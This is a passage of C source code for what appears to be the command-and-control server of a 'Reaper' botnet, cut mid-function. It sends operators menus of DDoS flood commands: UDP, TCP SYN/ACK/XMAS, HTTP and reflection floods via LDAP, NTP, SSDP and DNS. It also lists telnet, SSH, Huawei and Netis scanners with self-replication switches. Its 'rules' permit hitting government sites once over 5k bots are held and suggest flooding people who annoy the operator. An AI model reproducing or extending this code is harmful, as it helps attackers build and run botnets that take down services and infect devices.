        sprintf(stress_udp2,  "\x1b[1;37m[\x1b[0;31mLayer4 TCP\x1b[1;37m]               L4TCP  \r\n");
        sprintf(stress_udp3,  "\x1b[1;37m[\x1b[0;31mLayer4 Spoofing\x1b[1;37m]          L4SPOOF  \r\n");
        sprintf(stress_udp4,  "\x1b[1;37m[\x1b[0;31mLayer7\x1b[1;37m]                   L7  \r\n");
        sprintf(stress_line2, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");  
        if(send(thefd, stress_cmd1, strlen(stress_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line1, strlen(stress_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp1, strlen(stress_udp1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp2, strlen(stress_udp2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp3, strlen(stress_udp3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_udp4, strlen(stress_udp4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line2, strlen(stress_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L4UDP") || strstr(buf, "l4udp") || strstr(buf, "l4UDP") || strstr(buf, "L4udp")) 
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char l4udp_cmd1  [5000];
        char l4udp_line1  [5000];
        char l4udp_udp1  [5000];
        char l4udp_udp2  [5000];
        char l4udp_udp3  [5000];
        char l4udp_udp4  [5000];
        char l4udp_udp5  [5000];
        char l4udp_line2  [5000];

        sprintf(l4udp_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Layer 4 UDP Listing\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(l4udp_line1, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(l4udp_udp1,  "\x1b[1;37m[\x1b[0;31mUDP Flood\x1b[1;37m]    !* UDP  [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 0 1\r\n");
        sprintf(l4udp_udp2,  "\x1b[1;37m[\x1b[0;31mSTD Flood\x1b[1;37m]    !* STD  [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(l4udp_udp3,  "\x1b[1;37m[\x1b[0;31mHOLD Flood\x1b[1;37m]   !* HOLD [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(l4udp_udp4,  "\x1b[1;37m[\x1b[0;31mJUNK Flood\x1b[1;37m]   !* JUNK [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(l4udp_udp5,  "\x1b[1;37m[\x1b[0;31mCNC Flood\x1b[1;37m]    !* CNC  [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mADMIN PORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(l4udp_line2, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");     
        if(send(thefd, l4udp_cmd1, strlen(l4udp_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_line1, strlen(l4udp_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp1, strlen(l4udp_udp1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp2, strlen(l4udp_udp2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp3, strlen(l4udp_udp3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp4, strlen(l4udp_udp4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp5, strlen(l4udp_udp5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_line2, strlen(l4udp_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L4TCP") || strstr(buf, "l4tcp") || strstr(buf, "l4TCP") || strstr(buf, "L4tcp")) 
        {
        char l4tcp_cmd1 [5000];
        char l4tcp_line1 [5000];
        char l4tcp_tcp1 [5000];
        char l4tcp_tcp2 [5000];
        char l4tcp_tcp3 [5000];
        char l4tcp_tcp4 [5000];
        char l4tcp_tcp5 [5000];
        char l4tcp_tcp6 [5000];
        char l4tcp_tcp7 [5000];
        char l4tcp_tcp8 [5000];
        char l4tcp_tcp9 [5000];
        char l4tcp_line2 [5000];

        sprintf(l4tcp_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Layer 4 TCP Listing\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(l4tcp_line1, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(l4tcp_tcp1,  "\x1b[1;37m[\x1b[0;31mTCP-ALL Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 ALL 0 1\r\n");
        sprintf(l4tcp_tcp2,  "\x1b[1;37m[\x1b[0;31mTCP-SYN Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 SYN 0 1\r\n");
        sprintf(l4tcp_tcp3,  "\x1b[1;37m[\x1b[0;31mTCP-FIN Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 FIN 0 1\r\n");
        sprintf(l4tcp_tcp4,  "\x1b[1;37m[\x1b[0;31mTCP-RST Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 RST 0 1\r\n");
        sprintf(l4tcp_tcp5,  "\x1b[1;37m[\x1b[0;31mTCP-PSH Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 PSH 0 1\r\n");
        sprintf(l4tcp_tcp6,  "\x1b[1;37m[\x1b[0;31mTCP-CRI Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 CRI 0 1\r\n");
        sprintf(l4tcp_tcp7,  "\x1b[1;37m[\x1b[0;31mTCP-PRO Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 PRO 0 1\r\n");
        sprintf(l4tcp_tcp8,  "\x1b[1;37m[\x1b[0;31mTCP-ACK Flood\x1b[1;37m]  !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 ACK 0 1\r\n");
        sprintf(l4tcp_tcp9,  "\x1b[1;37m[\x1b[0;31mTCP-XMAS Flood\x1b[1;37m] !* TCP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m] 32 XMAS 0 1\r\n");
        sprintf(l4tcp_line2, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");     
        if(send(thefd, l4tcp_cmd1, strlen(l4tcp_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_line1, strlen(l4tcp_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp1, strlen(l4tcp_tcp1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp2, strlen(l4tcp_tcp2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp3, strlen(l4tcp_tcp3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp4, strlen(l4tcp_tcp4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp5, strlen(l4tcp_tcp5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp6, strlen(l4tcp_tcp6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp7, strlen(l4tcp_tcp7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp8, strlen(l4tcp_tcp8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_tcp9, strlen(l4tcp_tcp9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_line2, strlen(l4tcp_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L7") || strstr(buf, "l7"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char l7_cmd1   [5000];
        char l7_line1  [5000];
        char l7_http1  [5000];
        char l7_http2  [5000];
        char l7_line2  [5000];
 
        sprintf(l7_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Layer 7 Method Listing\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(l7_line1, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(l7_http1, "\x1b[1;37m[\x1b[0;31mHTTP Flood\x1b[1;37m]   !* HTTP  [\x1b[0;31mURL\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(l7_http2, "\x1b[1;37m[\x1b[0;31mWGET Flood\x1b[1;37m]   !* WGET  [\x1b[0;31mURL\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(l7_line2, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");     
        if(send(thefd, l7_cmd1, strlen(l7_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_line1, strlen(l7_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_http1, strlen(l7_http1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_http2, strlen(l7_http2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_line2, strlen(l7_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "EXTRA")) { // We Are Attempting To Display Extra CMDs!
        EXTRA:
        pthread_create(&title, NULL, &titleWriter, sock);
        char extra_cmd1 [5000];
        char extra_line1 [5000];
        char extra_list1 [5000];
        char extra_list2 [5000];
        char extra_list3 [5000];
        char extra_list4 [5000];
        char extra_line2 [5000];
    
        sprintf(extra_cmd1, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]UDP Methods\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(extra_line1, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(extra_list1, "\x1b[0;37mNo Hitting Government Sites Unless Bot count is above 5k\r\n");
        sprintf(extra_list2, "\x1b[0;37mMax TIme =\x1b[0;31m1000\r\n");
        sprintf(extra_list3, "\x1b[0;37mThat Does Not Mean Spam \x1b[0;31m1000\r\n");
        sprintf(extra_list4, "\x1b[0;37mIf Someone Is Pissing You off Just do \x1b[0;31m100\x1b[1;37m-\x1b[0;31m600\x1b[1;37m Seconds\r\n");
        sprintf(extra_line2, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");

        if(send(thefd, extra_cmd1, strlen(extra_cmd1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_line1, strlen(extra_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list1, strlen(extra_list1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list2, strlen(extra_list2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list3, strlen(extra_list3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list4, strlen(extra_list4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_line2, strlen(extra_line2), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "REAPER")) { // We Are Attempting To Display Scanners And Selfreps!
        SCAN:
        pthread_create(&title, NULL, &titleWriter, sock);
        char reaper_cmd1 [5000];
        char reaper_line1 [5000];
        char reaper_scan1 [5000];
        char reaper_scan2 [5000];
        char reaper_scan3 [5000];
        char reaper_scan4 [5000];
        char reaper_cmd2 [5000];
        char reaper_line2 [5000];
        char reaper_selfrep1 [5000];
        char reaper_selfrep2 [5000];
        char reaper_selfrep3 [5000];
        char reaper_selfrep4 [5000];
        char reaper_line3 [5000];

        sprintf(reaper_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Scanner Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(reaper_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(reaper_scan1,  "\x1b[1;37m[\x1b[0;31mTelnet Scanner\x1b[1;37m]  -  !* SCANNER \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_scan2,  "\x1b[1;37m[\x1b[1;32mSSH\x1b[1;37m] - !* SSH \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_scan3,  "\x1b[1;37m[\x1b[1;33mHuawei Scanner\x1b[1;37m] - !* HUAWEI \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_scan4,  "\x1b[1;37m[\x1b[1;34mNetis\x1b[1;37m] - !* NETIS \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_cmd2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Selfrep Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(reaper_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(reaper_selfrep1,  "\x1b[1;37m[0;31mTelnet Selfrep\x1b[1;37m] - !* SELFTEL \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_selfrep2,  "\x1b[1;37m[1;32mSSH Selfrep\x1b[1;37m] - !* SSHTEL \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_selfrep3,  "\x1b[1;37m[1;33mHuawei Selfrep\x1b[1;37m] - !* HTEL \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_selfrep4,  "\x1b[1;37m[1;34mNETIS Selfrep\x1b[1;37m] - !* NETTEL \x1b[1;32mON \x1b[1;37m|| \x1b[0;31mOFF  \r\n");
        sprintf(reaper_line3,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");

        if(send(thefd, reaper_cmd1, strlen(reaper_cmd1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_line1, strlen(reaper_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_scan1, strlen(reaper_scan1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_scan2, strlen(reaper_scan2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_scan3, strlen(reaper_scan3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_scan4, strlen(reaper_scan4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_cmd2, strlen(reaper_cmd2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_line2, strlen(reaper_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_selfrep1, strlen(reaper_selfrep1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_selfrep2, strlen(reaper_selfrep2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_selfrep3, strlen(reaper_selfrep3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_selfrep4, strlen(reaper_selfrep4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_line3, strlen(reaper_line3), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        
        if(strstr(buf, "RULES")) { // We Are Attempting To Display The Rules!
        RULES:
        pthread_create(&title, NULL, &titleWriter, sock);
        char rule_cmd1  [5000];
        char rule_line1  [5000];
        char rule_1  [5000];
        char rule_2  [5000];
        char rule_3  [5000];
        char rule_4  [5000];
        char rule_5  [5000];
        char rule_line2  [5000];
 
        sprintf(rule_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]RULES\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
        sprintf(rule_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(rule_1,  "\x1b[1;37m[\x1b[1;31m1\x1b[1;37m] - No Rapid Booting\r\n");
        sprintf(rule_2,  "\x1b[1;37m[\x1b[1;32m2\x1b[1;37m] - No Sharing Users\r\n");
        sprintf(rule_3,  "\x1b[1;37m[\x1b[0;33m3\x1b[1;37m] - No Going Over Time\r\n");
        sprintf(rule_4,  "\x1b[1;37m[\x1b[0;34m4\x1b[1;37m] - No Using Scanner Commands\r\n");
        sprintf(rule_5,  "\x1b[1;37m[\x1b[0;35m5\x1b[1;37m] - No Hitting Government Sites Unless Bots are over 5k\r\n");
        sprintf(rule_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        
        if(send(thefd, rule_cmd1,  strlen(rule_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_line1,  strlen(rule_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_1,  strlen(rule_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_2,  strlen(rule_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_3,  strlen(rule_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_4,  strlen(rule_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_5,  strlen(rule_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_line2,  strlen(rule_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "PORTS")) { // We Are Attempting To Display Usable Ports!
        PORTS:
        pthread_create(&title, NULL, &titleWriter, sock);
        char port_cmd1  [5000];
        char port_line1  [5000];
        char port_1  [5000];
        char port_2  [5000];
        char port_3  [5000];
        char port_4  [5000];
        char port_5  [5000];
        char port_6  [5000];
        char port_7  [5000];
        char port_8  [5000];
        char port_line2  [5000];
                
        sprintf(port_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]PORTS\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
        sprintf(port_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(port_1,  "\x1b[1;37m[\x1b[0;31m22\x1b[1;37m] \x1b[1;37m- SSH\r\n");
        sprintf(port_2,  "\x1b[1;37m[\x1b[1;32m23\x1b[1;37m] \x1b[1;37m- Telnet Protocol\r\n");
        sprintf(port_3,  "\x1b[1;37m[\x1b[1;33m50\x1b[1;37m] \x1b[1;37m- Remote Mail Checking Protocol\r\n");
        sprintf(port_4,  "\x1b[1;37m[\x1b[1;34m80\x1b[1;37m] \x1b[1;37m- HTTP\r\n");
        sprintf(port_5,  "\x1b[1;37m[\x1b[1;35m69\x1b[1;37m] \x1b[1;37m- Trivial File Transfer Protocol\r\n");
        sprintf(port_6,  "\x1b[1;37m[\x1b[1;36m77\x1b[1;37m] \x1b[1;37m- Any Private Remote Job Entry\r\n");
        sprintf(port_7,  "\x1b[1;37m[\x1b[0;31m666\x1b[1;37m] \x1b[1;37m- Doom\r\n");
        sprintf(port_8,  "\x1b[1;37m[\x1b[1;32m995\x1b[1;37m] \x1b[1;37m- good for NFO, OVH, VPN\r\n");
        sprintf(port_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");

        if(send(thefd, port_cmd1,  strlen(port_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_line1,  strlen(port_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_1,  strlen(port_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_2,  strlen(port_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_3,  strlen(port_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_4,  strlen(port_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_5,  strlen(port_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_6,  strlen(port_6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_7,  strlen(port_7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_8,  strlen(port_8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, port_line2,  strlen(port_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        
        if(strstr(buf, "L4SPOOF") || strstr(buf, "l4spoof") || strstr(buf, "l4SPOOF")) 
        {  
        pthread_create(&title, NULL, &titleWriter, sock); 
        char spoof_cmd1  [5000]; 
        char spoof_line1  [5000]; 
        char spoof_1  [5000]; 
        char spoof_2  [5000]; 
        char spoof_3  [5000]; 
        char spoof_4  [5000]; 
        char spoof_5  [5000]; 
        char spoof_6  [5000]; 
        char spoof_7  [5000]; 
        char spoof_8  [5000]; 
        char spoof_9  [5000]; 
        char spoof_cmd2  [5000]; 
        char spoof_line2  [5000]; 
        char spoof_list1  [5000]; 
        char spoof_list2  [5000]; 
        char spoof_list3  [5000]; 
        char spoof_list4  [5000]; 
        char spoof_list5  [5000]; 
        char spoof_list6  [5000]; 
        char spoof_list7  [5000]; 
        char spoof_list8  [5000]; 
        char spoof_list9  [5000]; 
        char spoof_line3  [5000]; 
 
        sprintf(spoof_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Spoofing Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n"); // We Are Defying Spoofed Attacks!
        sprintf(spoof_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); // We Are Defying Spoofed Attacks!
        sprintf(spoof_1,  "\x1b[1;37m[\x1b[1;31mLDAP Flood\x1b[1;37m]     !* LDAP    [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_2,  "\x1b[1;37m[\x1b[1;32mNTP Flood\x1b[1;37m]      !* NTP     [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_3,  "\x1b[1;37m[\x1b[1;33mSSDP Flood\x1b[1;37m]     !* SSDP    [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_4,  "\x1b[1;37m[\x1b[1;34mDNS Flood\x1b[1;37m]      !* DNS     [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_5,  "\x1b[1;37m[\x1b[1;35mREAPER Flood\x1b[1;37m]   !* REAPER  [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_6,  "\x1b[1;37m[\x1b[1;36mMSSQL Flood\x1b[1;37m]    !* MSSQL   [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_7,  "\x1b[1;37m[\x1b[1;31mPORTMAP Flood\x1b[1;37m]  !* PORTMAP [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_8,  "\x1b[1;37m[\x1b[1;32mTS3 Flood\x1b[1;37m]      !* TS3     [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_9,  "\x1b[1;37m[\x1b[1;33mSENTINEL Flood\x1b[1;37m] !* SENTINEL [\x1b[0;31mIP\x1b[1;37m] [\x1b[0;31mPORT\x1b[1;37m] [\x1b[0;31mTIME\x1b[1;37m]\r\n");
        sprintf(spoof_cmd2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Reflection Listing\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(spoof_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(spoof_list1,  "\x1b[1;37m[\x1b[0;31mLDAP\x1b[1;37m]:\x1b[1;31m 0 \r\n"); 
        sprintf(spoof_list2,  "\x1b[1;37m[\x1b[1;32mNTP\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list3,  "\x1b[1;37m[\x1b[1;33mSSDP\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list4,  "\x1b[1;37m[\x1b[1;34mDNS\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list5,  "\x1b[1;37m[\x1b[1;35mREAPER\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list6,  "\x1b[1;37m[\x1b[1;36mMSSQL\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list7,  "\x1b[1;37m[\x1b[0;31mPORTMAP\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list8,  "\x1b[1;37m[\x1b[1;32mTS3\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_list9,  "\x1b[1;37m[\x1b[1;33mSENTINEL\x1b[1;37m]:\x1b[1;31m 0\r\n"); 
        sprintf(spoof_line3,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); // We Are Defying Spoofed Attacks!

        if(send(thefd, spoof_cmd1,  strlen(spoof_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_line1,  strlen(spoof_line1),   MSG_NOSIGNAL) == -1) goto end;
